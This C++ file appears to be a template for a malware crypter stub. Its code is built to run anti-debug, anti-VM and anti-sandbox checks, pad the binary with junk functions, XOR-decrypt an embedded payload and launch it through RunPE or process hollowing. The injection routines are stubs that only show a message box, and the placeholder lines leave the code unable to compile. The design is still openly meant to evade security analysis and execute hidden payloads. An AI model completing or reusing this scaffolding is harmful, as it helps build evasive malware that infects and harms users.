#include <windows.h>
#include <vector>
#include <string>
#include <stdint.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

void JunkBlock1() { /*JUNK1*/ }
void JunkBlock2() { /*JUNK2*/ }
void JunkBlock3() { /*JUNK3*/ }
void JunkBlock4() { /*JUNK4*/ }
void JunkBlock5() { /*JUNK5*/ }
void JunkBlock6() { /*JUNK6*/ }
void UselessFunc1(int n) { for (int i=0; i<n; ++i) { volatile int x = i*i; } }
int UselessFunc2(int a, int b) { return a*b + a - b; }
bool UselessFunc3() { SYSTEMTIME st; GetSystemTime(&st); return st.wYear > 2022; }

bool AntiDebug() { //ANTIDEBUG }
bool AntiVM() { //ANTIVM }
bool AntiSandbox() { //ANTISANDBOX }
bool AntiTiming() { //ANTITIMING }

void RunAllChecks() {
    JunkBlock1(); JunkBlock2(); JunkBlock3();
    if (AntiDebug() || AntiVM() || AntiSandbox() || AntiTiming())
        ExitProcess(42);
    JunkBlock4(); JunkBlock5(); JunkBlock6();
}

static const char* g_sig = "STUB_SIG_/*RANDSTR*/";
static const uint32_t g_buildTime = /*BUILDTIME*/;
static const char* g_key = "/*KEY*/";
static const int g_method = /*METHOD*/; // 0=RunPE, 1=Hollowing
static const uint8_t g_payload[] = { /*PAYLOAD*/ };
static const size_t g_payload_size = sizeof(g_payload);

void DecryptPayload(std::vector<uint8_t>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
}

bool RunPE(const std::vector<uint8_t>& exe) {
    MessageBoxA(0, "RunPE called!", "STUB", 0);
    return true;
}
bool Hollowing(const std::vector<uint8_t>& exe) {
    MessageBoxA(0, "Hollowing called!", "STUB", 0);
    return true;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    RunAllChecks();
    std::vector<uint8_t> payload(g_payload, g_payload + g_payload_size);
    DecryptPayload(payload, g_key);
    if (g_method == 0)
        RunPE(payload);
    else
        Hollowing(payload);
    return 0;
}